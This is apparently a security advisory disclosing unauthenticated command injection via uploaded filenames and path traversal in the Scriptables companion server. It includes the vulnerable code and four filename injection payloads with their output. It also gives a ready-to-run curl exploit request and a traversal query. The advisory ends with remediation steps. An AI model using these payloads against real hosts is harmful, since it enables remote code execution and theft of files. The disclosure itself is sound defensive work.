# VDR-003: OS Command Injection via Filename in im3x/Scriptables

- **Target**: [im3x/Scriptables](https://github.com/im3x/Scriptables)
- **Severity**: Critical (CVSS 3.1: 9.8)
- **CWE**: [CWE-78](https://cwe.mitre.org/data/definitions/78.html) - OS Command Injection (primary); [CWE-22](https://cwe.mitre.org/data/definitions/22.html) - Path Traversal (secondary)
- **CVE**: [CVE-2026-38595](https://www.cve.org/CVERecord?id=CVE-2026-38595)
- **CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Discovered**: 2026-04-14
- **Researcher**: Dennis Sepede - [Securitix Solutions](https://securitixsolutions.com)

## Summary

`im3x/Scriptables` (the `v2-dev` branch, the project's only published code) exposes an unauthenticated `POST /sync` endpoint that interpolates the uploaded filename directly into a shell command string passed to `child_process.execSync()`. An attacker can craft a filename containing shell metacharacters (backticks, `$()`, `;`, quote-breakouts) to execute arbitrary OS commands on the host with the privileges of the Node.js process.

The server binds to `0.0.0.0:5566` by default and ships with no authentication, so any network-reachable instance is exploitable without prior access.

A secondary path-traversal vulnerability ([CWE-22](https://cwe.mitre.org/data/definitions/22.html)) in the `GET /sync` handler lets an attacker read arbitrary `*.js` files from the host filesystem via the `name` query parameter.

## Affected Component

- `app.js:63-84` - `POST /sync` handler. Builds `cmd` from the attacker-controlled `originalname` (`app.js:67-68`, `74`) and runs `child_process.execSync(cmd)` (`app.js:83`).
- `app.js:39-44` - `GET /sync` handler. Joins the `name` query parameter into a path with no normalisation (`app.js:43`), enabling traversal (secondary CWE-22).
- `app.js:9` / `app.js:128` - default bind `HTTP_PORT = 5566` via `app.listen(HTTP_PORT)` on all interfaces, no auth middleware anywhere in the file.

## Details

### Primary: OS command injection (`POST /sync`)

The handler takes the uploaded file's client-supplied `originalname`, builds a path from it, then constructs a shell command string and executes it:

```js
// app.js:63-84  (verbatim)
app.post("/sync", (req, res) => {
  if (req.files.length !== 1) return res.send("no")
  console.log('[+] Scriptalbe App 已连接')
  const _file = req.files[0]
  const FILE_NAME = _file['originalname'] + '.js'                 // 67  attacker-controlled
  const WIDGET_FILE = path.join(SCRIPTS_DIR, FILE_NAME)           // 68
  fs.renameSync(_file['path'], WIDGET_FILE)                       // 69
  res.send("ok")
  console.log(`[*] 小组件源码（${_file['originalname']}）已同步，请打开编辑`)
  FILE_DATE = fs.statSync(WIDGET_FILE).mtimeMs
  // 尝试打开
  let cmd = `code "${WIDGET_FILE}"`                               // 74  <-- filename in shell string
  if (os.platform() === "win32") {
    cmd = `cmd.exe /c ${cmd}`                                     // 76
  } else if (os.platform() === "linux") {
    let shell = process.env["SHELL"]
    cmd = `${shell} -c ${cmd}`                                    // 79
  } else {
    cmd = `"/Applications/Visual Studio Code.app/Contents/MacOS/Electron" "${WIDGET_FILE}"` // 81 (macOS)
  }
  child_process.execSync(cmd)                                     // 83  <-- SINK
})
```

`WIDGET_FILE` is derived from `originalname` (the multipart filename, fully attacker-controlled) and is embedded into `cmd` inside double quotes. `child_process.execSync(cmd)` runs `cmd` through a shell (`/bin/sh -c` on POSIX, `cmd.exe /c` on Windows). On the project's intended platforms - macOS (the `darwin` branch at line 81) and Linux (line 79) - filenames may legally contain backticks, `$()`, `;` and `"`, so a crafted filename **breaks out of the quotes and injects commands** that the shell then executes.

There is **no input validation, allow-listing, or shell-argument escaping** anywhere between the network input and the sink. The endpoint has no authentication.

### Secondary: path traversal (`GET /sync`)

```js
// app.js:39-44  (verbatim)
app.get('/sync', (req, res) => {
  const { name } = req.query
  const WIDGET_FILE = path.join(SCRIPTS_DIR, name + '.js')        // 43  no normalisation guard
  if (!fs.existsSync(WIDGET_FILE)) return res.send("nofile").end()
  ...
  res.sendFile(WIDGET_FILE)                                       // 55  returns the file
```

`name` is concatenated with `.js` and joined onto `SCRIPTS_DIR`. `path.join` resolves `..` segments, so `name=../../../<path>/secret` reads `<path>/secret.js` from anywhere on the filesystem the process can read. The handler then returns the file body.

### Platform note (honest drift)

The command execution was validated on the **POSIX shell semantics that govern the macOS/Linux deployment** (the realistic target - Scriptables is a companion dev server for the Scriptable iOS app, primarily run on a Mac). On the **Windows** branch (`cmd.exe /c code "<path>"`, line 76) the metacharacters land *inside* the double quotes and `cmd.exe` treats them literally, while characters such as `" | < >` are illegal in Windows filenames and cause `fs.renameSync` to fail first; consequently the injection does **not** fire on Windows. This is a platform-specific mitigation, not a fix - the code is unchanged and vulnerable on its primary platforms. The PoC below proves both halves: the real server reaching the sink, and the POSIX shell executing the injected commands from the filename.

## Proof of Concept

Two complementary, honestly-labelled artifacts were used (Node v22.14.0; Scriptables at commit `a091f10`, `v2-dev`):

1. **Real unmodified server** (`app.js`, driven by `poc/VDR-003/run_realserver_poc.sh`) - proves the endpoints are unauthenticated, reach the sink, accept metacharacter filenames onto disk, and that `GET /sync` traversal reads files outside `Scripts/`.
2. **Faithful POSIX sink harness** (`poc/VDR-003/sink_harness_posix.sh`) - lifts the exact sink construction from `app.js:67-83` (Linux branch) and runs it through a POSIX shell exactly as `execSync` does, proving arbitrary command execution from the filename. (Used because the harness host is Windows; see platform note. `poc/VDR-003/sink_harness_win.js` reproduces the Windows branch and documents why it does not fire there.)

### A) Real server (`poc/VDR-003/OUTPUT_realserver.txt`)

```
[1] Liveness (GET /ping, no auth):
    pong

[2] POST /sync benign upload (UNAUTHENTICATED) -> reaches sink:
ok    HTTP:200
    Scripts/ now contains: BenignWidget.js

[3] POST /sync with metacharacter filename -> accepted to disk (injection precondition):
ok    HTTP:200
    Scripts/ entries with backtick: a`id`b.js

[4] GET /sync path traversal (read secret_widget.js OUTSIDE Scripts/):
    name=../../../VDR-003-poc-build/SECRET_OUTSIDE_SCRIPTABLES/secret_widget
    response body: SECRET_TOKEN_CVE_2026_38595_traversal_read_ok
```

- `[2]` Unauthenticated `POST /sync` is accepted and reaches the `execSync` sink.
- `[3]` A filename containing backticks (`` a`id`b ``) is accepted and written to disk as `` a`id`b.js `` - the precondition for injection on the target platforms.
- `[4]` `GET /sync` with a traversal `name` returns the contents of a `.js` file located **outside** the `Scripts/` directory - secondary CWE-22 proven end-to-end against the live server.

### B) Faithful POSIX command-injection harness (`poc/VDR-003/OUTPUT_posix_injection.txt`)

The harness builds `${SHELL} -c code "<SCRIPTS_DIR>/<originalname>.js"` (exactly `app.js:74`+`79`) and hands it to `sh -c` as `execSync` would. Four independent payloads, each creating a sentinel:

```
### Vector 1: backtick `touch SENTINEL_SH_PWN.txt` ###
CONSTRUCTED_CMD: /bin/bash.exe -c code ".../Scripts_harness_sh/a`touch SENTINEL_SH_PWN.txt`b.js"
RESULT: SENTINEL_SH_PWN.txt CREATED -> command executed

### Vector 2: $(touch SENTINEL_DOLLAR.txt) ###
CONSTRUCTED_CMD: /bin/bash.exe -c code ".../Scripts_harness_sh/x$(touch SENTINEL_DOLLAR.txt)y.js"
RESULT: SENTINEL_DOLLAR.txt CREATED -> command executed

### Vector 3: quote-breakout "; touch SENTINEL_SEMI.txt ;" ###
CONSTRUCTED_CMD: /bin/bash.exe -c code ".../Scripts_harness_sh/x";touch SENTINEL_SEMI.txt;".js"
RESULT: SENTINEL_SEMI.txt CREATED -> command executed

### Vector 4: output capture `whoami>WHOAMI_OUT.txt` ###
CONSTRUCTED_CMD: /bin/bash.exe -c code ".../Scripts_harness_sh/a`whoami>WHOAMI_OUT.txt`b.js"
captured user: Dennis
```

Every payload executed: three created sentinel files, and the fourth captured the output of `whoami` (`Dennis`) by redirecting it to a file - demonstrating both blind execution and output exfiltration purely via the uploaded filename.

### End-to-end exploit request (Linux/macOS target)

Combining both halves, a single unauthenticated request executes a command:

```bash
# 'name' below is the multipart filename; backticks run on the POSIX target host.
curl -s -F 'file=@payload.js;filename=a`id > /tmp/pwned`b' 'http://TARGET:5566/sync'
# -> server runs:  $SHELL -c code ".../Scripts/a`id > /tmp/pwned`b.js"  -> /tmp/pwned created
```

## Impact

- **Unauthenticated Remote Code Execution** with the privileges of the Scriptables Node.js process on Linux/macOS hosts (the project's target platforms). No authentication, no user interaction.
- **Arbitrary File Read** via `GET /sync` path traversal (any `*.js` the process can read), proven against the live server.
- Because the service binds all interfaces on `:5566` with no auth, any reachable instance (including accidentally LAN/Internet-exposed dev machines) is fully compromised.

## Recommendation

The project is unmaintained (last commit December 2020) and no fix is planned. Operators should:

- Take any reachable instance **offline immediately**; never expose `:5566` to untrusted networks.
- If the code must be run, eliminate the shell entirely: open the editor with `child_process.execFile('code', [WIDGET_FILE])` (argument vector, no shell), and reject/normalise filenames (strip path separators and shell metacharacters; validate against an allow-list). For `GET /sync`, resolve the final path and verify it is contained within `SCRIPTS_DIR` before reading.
- Bind to `127.0.0.1` only and add authentication.
- Migrate to an actively maintained alternative.

## Status

| Date | Event |
|------|-------|
| 2026-04-14 | Vulnerability discovered during source code audit |
| 2026-04-14 | CVE request submitted to MITRE (no private channel available) |
| 2026-04-14 | CVE-2026-38595 assigned by MITRE |
| 2026-06-05 | Full technical advisory published (coordinated-disclosure window elapsed; upstream unmaintained) |
| - | Upstream maintainer: project unmaintained (last commit December 2020) |

## References

- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [Upstream repository: im3x/Scriptables](https://github.com/im3x/Scriptables)
